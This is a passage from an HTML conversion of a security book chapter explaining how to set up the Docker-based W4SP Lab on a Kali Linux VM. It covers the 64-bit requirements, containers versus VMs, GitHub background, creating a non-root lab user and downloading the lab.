><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:17.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2><a name="The W4SP Lab" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="_bookmark166" ></a>The W4SP Lab</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The W4SP Lab is an environment presenting a subnet of VMs. Unlike with VMs created in VirtualBox, however, the systems presented in the W4SP Lab consume far less memory and occupy far less disk space.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >This is possible because the lab technically is not run using virtualization, but with Docker. More on that soon, but first let&#8217;s discuss the requirements needed to run the W4SP Lab.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.0500pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Requirements</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section80" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-right:10.4500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >A key requirement for the W4SP lab is a VM running 64-bit Kali Linux. For this, host machine&#8217;s CPU should be capable of handling 64- bit addressing.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;margin-right:7.4000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The W4SP Lab is run from within the Kali Linux VM you just installed. And that VM must be the 64-bit version, which requires a host system to have a 64- bit-capable processor. Again, this is fairly common already for desktop computers, but it&#8217;s best to verify. On a Windows machine, this is done through Settings </span><span style="mso-spacerun:'yes';font-family:'MS UI Gothic';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:15.0000pt;" >&#8680; </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >System </span><span style="mso-spacerun:'yes';font-family:'MS UI Gothic';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:15.0000pt;" >&#8680; </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >About, revealing specifications about the current operating system installation, as shown in<a name="_bookmark167" ></a>&nbsp;</span><span><a href="#_bookmark169" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-40</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="198.75"  height="0" ></td></tr><tr><td></td><td><img width="623"  height="363"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker97105.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.0500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark169" ></a><span><a href="#_bookmark167" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-40:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >System settings</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >If you see your host operating system is a 64-bit version, then your VM and W4SP Lab should both run as needed.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="128.75"  height="0" ></td></tr><tr><td></td><td><img width="763"  height="270"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker97280.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:5.0000pt;" ><o:p>&nbsp;</o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section81" ><p class=MsoBodyText  style="margin-left:13.2500pt;" ><span><span style="position:absolute;z-index:1;margin-left:0.0000px;margin-top:0.0000px;width:763.0000px;height:82.0000px;" ><img width="763"  height="82"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker97308.png" ></span></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2 style="margin-top:4.4000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >A Few Words about Docker</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:9.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >An alternative to creating a VM is containerization. Containerization is a big word for its small footprint. There are key differences between running VMs (using virtualization) and using containerization. A VM is a complete operating system, including its kernel and any applications you want running on that VM. A container, however, is just the application you want running, wrapped in just enough software to keep it independent. With containers, you can have several applications running, but sharing the Linux kernel of their host operating system. When you need to run many systems at once, containerization quickly benefits from the economy of scale, versus trying to have ample host memory for the same number of VMs to parcel up.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.9500pt;margin-right:9.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Docker is a relatively new project, becoming open source only a few years ago. In a short time, Docker has grown to become one of the most popular open-source projects, with major contributions by companies such as Google, Cisco, Red Hat, Microsoft, and others. And at the time of this writing, Docker is widely seen as the successor to VMs. Rightfully so, we think, so we made use of Docker to create an entire virtual network of systems on which to run your own labs.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >This environment built with Docker is special because, unlike creating VMs from scratch with VirtualBox, this W4SP Lab provides a subnet of VMs, all self-contained.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Now, given we just discussed Docker, containerization, and VMs, it&#8217;s time to offer a small technical disclaimer. Our W4SP Lab uses Docker and containerization to provide you with several virtual systems.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Technically, these systems are Linux containers, using Docker, not VMs using a hypervisor. Conceptually, however, the containers can be thought of as VMs, which is why throughout the book we refer to the systems within the W4SP Lab as VMs.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section82" ><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="position:absolute;z-index:-1;margin-left:128.7500px;margin-top:120.0000px;width:763.0000px;height:539.0000px;" ><img width="763"  height="539"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker99158.png" ></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:12.5000pt;" ><o:p>&nbsp;</o:p></span></p><h1 style="margin-top:4.4500pt;margin-left:20.0000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:24.5000pt;" >REASONS BEHIND GITHUB</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:24.5000pt;" ><o:p></o:p></span></b></h1><p class=MsoBodyText  style="margin-top:20.0500pt;margin-right:21.6000pt;margin-left:20.0000pt;" ><a name="_bookmark170" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Linux, one of the most successful open-source projects, had a problem. Linux had been able to harness the power of open source to attract developers all over the world to work together on it. The problem was safely managing all of these developers and the code they were producing even though they were all working on different parts. While tools existed for doing source code control, Linus, the original developer of Linux thought he could do better. This is how Git was born. Git works as a version control system, tracking versions of source code with &#8220;snapshots,&#8221; and maintains version integrity by creating hashes of each version. But most of us don&#8217;t work enough complex projects to justify keeping our own Git server. This is where GitHub comes in. GitHub provides Git server as well as a number of extra features that makes managing, sharing, and collaborating on code a snap.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:17.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2 style="margin-top:10.4000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >What Is GitHub?</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >We won&#8217;t assume you&#8217;ve ever visited GitHub before. Maybe you heard of it or came across a link to someone&#8217;s project hosted on GitHub. But unless you&#8217;re a software developer or web programmer, clicking on a GitHub link ends with backing out and mumbling &#8220;Someday I&#8217;ll figure out how that helps me&#8230; .&#8221; Well, today&#8217;s that day.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Yes, information security is very broad, with people often staying in specialties, many of which require no coding or development. But for infosec folks who </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >do </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >write code, even the smallest scripts, there are common headaches with coding that GitHub helps to cure. Let&#8217;s take a few words to explain how GitHub got so important.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Developing a piece of software seems to be a thing you can start but can never completely finish. It starts with developers writing enough code to perform the function they wanted. Then end users enjoy it (ideally). But then end users want another function </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >and </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >to tweak the function already there. So, the developer returns to the code to add</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section83" ><p class=MsoBodyText  style="margin-top:3.5500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and tweak. And add and tweak. It never ends, see?</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.9000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >On top of that, software development is something at which you can be good, but likely you are not the very best in the world. As with everything, there is always someone with value to offer and share.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >With writing software, you want </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >that someone </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >to see your code and you need a way to keep track of any tweaks he or she suggests for your own approval. Enter GitHub.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >GitHub is a place where people can publish their code, keep track of changes done so far (</span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >versioning</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >), as well as invite others to make changes. GitHub is a hosted Git service with a fancy web user interface. In GitHub speak, coders publish their repositories, or</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.2500pt;font-size:15.0000pt;" >&nbsp;</span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >repos</span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, for others to collaborate on. Being a collaborative service, GitHub also has a social network feel to it. The social network <a name="_bookmark171" ></a>side of it empowers different repo owners and collaborators to interact. To see more of what GitHub collaborators are up to, visit </span><span><a href="https://github.com/" ><u><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:12.0000pt;" >GitHub.com</span></u><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;color:rgb(0,0,255);font-size:12.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and click Explore.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >As a security person, you are likely concerned about the &#8220;making changes&#8221; part. Don&#8217;t worry. No one makes permanent, unauthorized changes to someone else&#8217;s repo. For every GitHub repo, there is the owner who reviews, and (maybe) approves, those changes. In the</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.0000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >case of the W4SP Lab to accompany this book, the authors are the repo owners. We&#8217;ll be watching the repo and bug tracker for suggested updates.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.2500pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Creating the Lab User</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >As a security professional, you are well aware of the risks of always being logged in as root. Best practice dictates that normal day-to-day work be done under a different account. Your lab work is no different.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Before installing the Lab, you create the user &#8220;w4sp-lab.&#8221; To do so, you start by opening a Terminal window. Terminal is found two ways: by clicking either on Applications at the top left of the Kali desktop or on the black Terminal icon on the left dock. A Terminal window opens, starting with you in the directory /root.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:7.7000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >At the root prompt, type </span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >useradd -m w4sp-lab -s /bin/bash -G</span></b><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" ><o:p></o:p></span></b></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section84" ><p class=MsoBodyText  style="margin-top:3.8000pt;margin-right:11.1500pt;" ><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >sudo -U </span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >at a Terminal window. Hit Enter to create the user. Nothing is echoed back.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The next step is to set the new user&#8217;s password. Again, in Terminal, type </span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >passwd w4sp-lab </span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >and hit Enter. You will be prompted for the password and again to confirm, as shown in<a name="_bookmark172" ></a>&nbsp;</span><span><a href="#_bookmark173" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-41</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="147.5"  height="0" ></td></tr><tr><td></td><td><img width="727"  height="310"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker103424.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.0500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark173" ></a><span><a href="#_bookmark172" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-41:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >New user w4sp-lab</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Now that you have this new user, you need to log out and log back in, as the user w4sp-lab.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="128.75"  height="0" ></td></tr><tr><td></td><td><img width="763"  height="194"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker103581.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:5.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.5000pt;" ><o:p>&nbsp;</o:p></span></p><h2 style="margin-top:4.3500pt;margin-right:52.5000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Installing the W4SP Lab on the Kali Virtual Machine</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.9500pt;" ><a name="_bookmark174" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Where to find this lab? Why, it&#8217;s available on GitHub, of course:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.2000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span><a href="https://github.com/w4sp-book/w4sp-lab/" ><u><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:12.0000pt;" >https://github.com/w4sp-book/w4sp-lab/</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.4000pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >There&#8217;s no need to sign up on GitHub to get the W4SP Lab. Only sign up if you&#8217;re interested in submitting bugs, contributing to it, or forking the code (copying the code to branch off of in your own repo).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section85" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Always check out the GitHub repo for updates to the lab. Any changes that are not reflected in the book will be noted in the repo. In addition to creating your own lab of VMs, there is available a fully contained &#8220;lab&#8221; of virtualized systems.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:17.2500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Note that you visit GitHub from a browser in the Kali VM, not from your host machine&#8217;s browser. As shown in<a name="_bookmark175" ></a>&nbsp;</span><span><a href="#_bookmark176" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-42</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, the Firefox web browser is used, the icon for which is at the top of the stack of icons on the Kali desktop. Browse to the GitHub address from above.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="216.25"  height="0" ></td></tr><tr><td></td><td><img width="588"  height="164"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker104553.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.0500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark176" ></a><span><a href="#_bookmark175" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-42:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Firefox to GitHub</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Clicking the green button labeled Clone or Download on the right expands to show a blue Download ZIP. Click to download as a ZIP file.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The file is named </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >w4sp-lab-master.zip</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. A pop-up window should appear asking what to do with the file (see<a name="_bookmark177" ></a>&nbsp;</span><span><a href="#_bookmark178" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-43</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >). Select the option Save File and click OK. You open it in a Terminal window.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="163.75"  height="0" ></td></tr><tr><td></td><td><img width="693"  height="394"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker104981.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:6.5000pt;" ><o:p>&nbsp;</o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:11.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section86" ><p class=MsoNormal  style="margin-top:3.7500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark178" ></a><span><a href="#_bookmark177" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-43:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Saving the W4SP Lab file</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;" ><a name="_bookmark179" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Once downloaded, unzip the compressed file and run the Lab installation script. To unzip the file, open a Terminal window. Open Terminal by clicking on Applications at the top left of the Kali desktop (see<a name="_bookmark180" ></a>&nbsp;</span><span><a href="#_bookmark181" ><u><span 